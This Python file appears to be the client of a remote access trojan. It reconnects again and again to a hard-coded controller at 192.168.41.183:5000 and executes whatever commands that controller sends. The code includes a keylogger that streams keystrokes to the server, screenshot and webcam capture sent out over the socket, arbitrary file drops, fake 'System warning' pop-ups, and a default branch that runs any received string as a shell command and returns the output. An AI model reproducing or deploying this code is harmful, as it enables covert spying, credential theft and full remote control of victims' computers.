import socket
import webbrowser as wb
import os
import subprocess
import time
from plyer import notification
import pyttsx3
import cv2
import pyautogui
from pynput.keyboard import Listener

HOST = '192.168.41.183'
PORT = 5000

def speak(audio):
    engine = pyttsx3.init("sapi5")
    engine.setProperty("rate",170)
    engine.setProperty("volume",1.0)
    engine.stop()
    engine.say(audio)
    engine.runAndWait()

# 🔥 reconnect loop
while True:
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST, PORT))
        break
    except:
        print("Server not available, retrying...")
        time.sleep(2)

print("Connected to server!")

def send_to_server(msg):
    client.sendall((msg + "\n").encode())

while True:
    try:
        data = client.recv(1024).decode().strip()
    except:
        print("Server disconnected. Reconnecting...")
        client.close()
        time.sleep(2)

        # 🔥 reconnect again
        while True:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.connect((HOST, PORT))
                print("Reconnected!")
                break
            except:
                time.sleep(2)
        continue

    if not data:
        continue

    print(f"Server: {data}")

    if data.startswith("open "):
        try:

            app = data.replace("open ", "").strip()
            #os.system("Taskkill /IM chrome.exe /F")
            #os.system("Taskkill /IM msedge.exe /F")
            #os.system("Taskkill /IM firefox.exe /F")
            wb.open(f"https://{app}.com")        

            send_to_server(f"{app} opened")   # 🔥 add this
        except:
            send_to_server("wrong domain name")

    elif data.lower() == "exit":
        break

    elif data.startswith("speak "):
        try:
            audio = data.replace("speak ", "").strip()
            speak(audio)
            send_to_server("voice speaked")   # 🔥 add this
        except:
            send_to_server("can't speak voice")
    
    elif data.lower() == "key_log":
        def on_press(key):
                try:
                    send_to_server(f"{key.char}")
                except AttributeError:
                    send_to_server(f"[{key}]")
        
        try:
            with Listener(on_press=on_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            send_to_server("Key Logger System Deactivated")
        
        

    elif data.startswith("show alert"):
        try:
            alert = data.replace("show alert ", "").strip()
            notification.notify(
                title="System warning",
                message=f"{alert}",
                timeout = 5
            )
            send_to_server(f"alert showed")   # 🔥 add this
        except:
            send_to_server("can't show the alert")
    
    elif data.lower() == "all app open":
        apps = [
            "excel","winword","powerpnt","outlook",
            "chrome","firefox","msedge",
            "cmd","powershell","ms-settings:",
            "explorer","notepad","calc","mspaint",
            "vlc","spotify"
        ]

        for app in apps:
            try:
                subprocess.Popen(f"start {app}", shell=True)
                send_to_server(f"{app} opened")
            except:
                send_to_server(f"{app} not found")



        
    elif data.lower() == "cap_screen":
        try:
            filename = "shot.png"

            screenshot = pyautogui.screenshot()
            screenshot.save(filename)

            filesize = os.path.getsize(filename)

            client.sendall(f"SCREEN {filename} {filesize}\n".encode()) 

            time.sleep(1)

            with open(filename, "rb") as f:
                while True:
                    chunk = f.read(1024)

                    if not chunk:
                        break

                    client.sendall(chunk)

            send_to_server("Screenshot sent successfully!")

        except Exception as e:
            send_to_server(f"Screenshot error: {e}")
        






    elif data.lower() == "cap_web":
        try:

            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)

            time.sleep(2)

            ret, frame = cam.read()

            if not ret:
                send_to_server("Failed to capture selfie")
                cam.release()
                continue

            filename = "selfie.png"

            cv2.imwrite(filename, frame)

            cam.release()
            cv2.destroyAllWindows()

            filesize = os.path.getsize(filename)

            # SEND HEADER
            header = f"SELFIE {filename} {filesize}\n"
            client.send(header.encode())

            time.sleep(0.5)

            # SEND IMAGE
            with open(filename, "rb") as f:

                while True:

                    chunk = f.read(1024)

                    if not chunk:
                        break

                    client.sendall(chunk)

            send_to_server("Selfie sent successfully!")

        except Exception as e:
            send_to_server(f"Webcam Error: {e}")





    elif data.startswith("FILE "):
        try:
            parts = data.split()
            filename = parts[1]
            filesize = int(parts[2])

            print(f"Receiving file: {filename}")

            with open(filename, "wb") as f:
                received = 0
                while received < filesize:
                    chunk = client.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                    received += len(chunk)

            send_to_server(f"{filename} received successfully")

        except Exception as e:
            send_to_server("file receive failed")







    else:
        try:
            data = subprocess.check_output(f"{data}", shell=True).decode()
            send_to_server(data)
            send_to_server("task complete")
        except:
           send_to_server(f"{data} command is wrong please give right command")
    
client.close()
